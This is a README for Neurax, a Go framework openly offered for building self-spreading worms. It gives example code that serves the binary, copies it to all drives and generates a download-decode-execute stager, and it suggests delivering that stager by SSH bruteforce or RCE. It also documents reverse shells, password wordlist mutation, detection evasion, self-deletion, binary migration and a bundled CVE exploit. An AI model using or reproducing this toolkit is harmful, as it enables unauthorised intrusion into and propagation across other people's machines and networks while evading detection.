<p align="center"> A framework that aids in creation of self-spreading software</p>

<br></br>

### Overview
With help of Neurax, Golang binaries can spread on LAN/WAN without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.


### Example code

```go
package main
import . "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  Nrx.Config.Port = 5555
  Nrx.Config.Stager = "wget"

  //Start a server that exposes the current binary in the background
  go NeuraxServer()
 
  //Copy current binary to all logical drives
  NeuraxDisks()

  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := NeuraxStager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

## New in v. 2.X (separate sub-project)
- Refactor: abandoned framework-like approach in favour of a ready-to-use binary
- Generic wget stager for all UNIX targets
- Single config file to tweak worm's behaviour on the fly
- Automatic self-removal via `unlinkat(2)`
- Example LinuxKI CVE exploit to supplement network spreading capabilities 
- JSON config file is downloaded and evaluated 
- Minimalistic re-write of host harvester 

## New in v. 2.5
- Optional background execution of the second-stage binary (`N.StagerBg`)
- Command stager saves and executes in context-local path 
- It also removes the downloaded binary right after successful execution
- Removed synchronized command execution mechanism for speed/stability reasons.
I will come up with a decent alternative prior to next release.
- `N.NoInfectCheck` to disable checking if host is already infected.
- Single-execution policy on target machine, enforced with an exclusive file mutex placed inside `NeuraxServer()`.
- Added a nested goroutine for serving the binary
- New `httrack` stager for Linux
- Commented-out common wordlist for detection evasion
- Command stager can wait before removing the binary (`N.StagerRemovalDelay`)

## New in v. 2.0
- New wordlist mutators + common passwords by country
- Improvised passive scanning
- `.FastScan` option that makes active scans a bit quicker
- Wordlists are created strictly in-memory
- `NeuraxScan()` accepts a callback function instead of channel as an argument.
- `NeuraxScan()` scans in infinite loop with possibility to set interval between each scan of whole subnet/pool of targets
- Reverse-DNS lookup for targets that are not in IP format
- Extraction of target candidates from ARP cache
- Possibility to scan only a selected list of targets + prioritizing specific targets (such as default gateways)
- Possibility to specify interface and timeout when using passive network scan.
- Improved command stager (can be optionally executed with elevated privileges / multiple times)
- Few changes of options' names
- `NeuraxConfig.` became `N.` (cause it's shorter to type)
- Functions for random memory allocation + binary migration
- Possibility to chain multiple stagers (ex. `wget` + `curl`)
- Volume and complexity of created wordlist can be easily tuned (with options such as `.WordlistExpand`)
- Possibility to set time-to-live of created binary

### Finding new targets
Function `NeuraxScan(func(string))` enables detection of active hosts on local network.
It's only argument is a callback function that is called in background for every active host.
Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `N.`

`NeuraxScan()` runs as infinite loop - it scans whole subnet specified by `.Cidr` config entry and when every host is scanned, function sleeps for an interval given in `.ScanInterval`.

### Disks infection
  Neurax binary doesn't have to copy itself using wireless means.
  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
  Copied binary is not executed, but simply resides in it's destination waiting to be run.
  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.

Another function, `NeuraxZIP(num_files int) err` allows to create a randomly named .zip archive containing current binary.
It is saved in current directory, and contains up to `num_files` random files it.

`NeuraxZIPSelf()` simply zips the current binary, creating an archive holding the same name.

### Reverse connections
An interactive reverse shell can be established with `NeuraxReverse()`.
It will receive commands from hostname specified inside `.ReverseListener` in a form of `"<host>:<port>"`.
Protocol that is used is defined under `.ReverseProto`
If `NeuraxOpenComm()` was started before calling this function, each command will behave as described in above section.
If it was not, commands will be executed locally.

Note: this function should be also runned as goroutine to prevent blocking caused by infinite loop used for receiving.

### Cleaning up
Whenever `"purge"` command is received by a node, it resends this command to all other nodes, removes itself from host and quits.
This behaviour can be also commenced using `NeuraxPurge()` executed somewhere in the source.

### Wordlist creation
If spread vector of your choice is based on some kind of bruteforce, it is good to have a proper wordlist prepared. 
Storing words in a text-file on client side isn't really effective, so you can mutate a basic wordlist using `NeuraxWordlist(...words) []string`.
To permute a set of given words, use `NeuraxWordlistPermute(..words) []string`

### Setting time-to-live 
If you want your binary to remove itself after given time, use `NeuraxSetTTL()` at the beginnig of your code.
This function should be launched as a goroutine.
For example:

`go NeuraxSetTTL("2m")`

will make the binary run `NeuraxPurgeSelf()` after 2 minutes from initial execution.

### Using multiple stagers at once
If you would like to chain all stagers available for given platform, set `.Stager` to `"chain"`.

### Moving the dropped binary
If you need to copy the binary after initial execution, use `NeuraxMigrate(path string)`.
It will copy the binary under `path`, remove current binary and execute newly migrated one.
